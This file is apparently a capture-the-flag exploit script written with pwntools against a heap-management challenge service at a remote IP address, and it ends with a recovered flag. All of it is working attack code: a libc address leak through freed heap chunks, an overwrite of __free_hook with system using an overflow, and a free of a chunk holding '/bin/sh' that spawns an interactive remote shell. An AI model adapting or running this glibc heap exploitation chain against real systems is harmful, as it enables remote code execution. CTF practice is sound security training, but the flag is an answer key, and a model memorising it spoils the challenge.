from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('./pwn')
io = remote('47.104.143.202', 25997)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./pwn')


def add(index, size):
    io.sendlineafter('Select:\n', '1')
    io.sendlineafter('Index:\n', str(index))
    io.sendlineafter('PayloadLength:\n', str(size))


def edit(index, content):
    io.sendlineafter('Select:\n', '2')
    io.sendlineafter('Index:\n', str(index))
    io.sendafter('BugInfo:\n', content)


def show(index):
    io.sendlineafter('Select:\n', '3')
    io.sendlineafter('Index:\n', str(index))


def delete(index):
    io.sendlineafter('Select:\n', '4')
    io.sendlineafter('Index:\n', str(index))


def pwn():
    for i in range(9):
        add(i, 0x88)
    for i in range(8):
        delete(i)
    for i in range(7):
        add(i, 0x88)
    add(7, 0x18)
    show(7)
    libc_base = u64(io.recv(6) + b'\x00\x00') - libc.sym['__malloc_hook'] - 0xf0
    log.success('libc_base: ' + hex(libc_base))
    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    delete(4)
    delete(5)
    payload = b'a' * 0x90 + p64(__free_hook)[:6] + b'\n'
    edit(6, payload)
    add(5, 0x88)
    add(4, 0x88)
    edit(4, p64(system) + b'\n')
    edit(5, b'/bin/sh\x00\n')
    # gdb.attach(io)
    delete(5)
    # pause()
    io.interactive()


if __name__ == '__main__':
    pwn()


# flag{7240aca686aa4bc4d7697b2d7b5c7655}
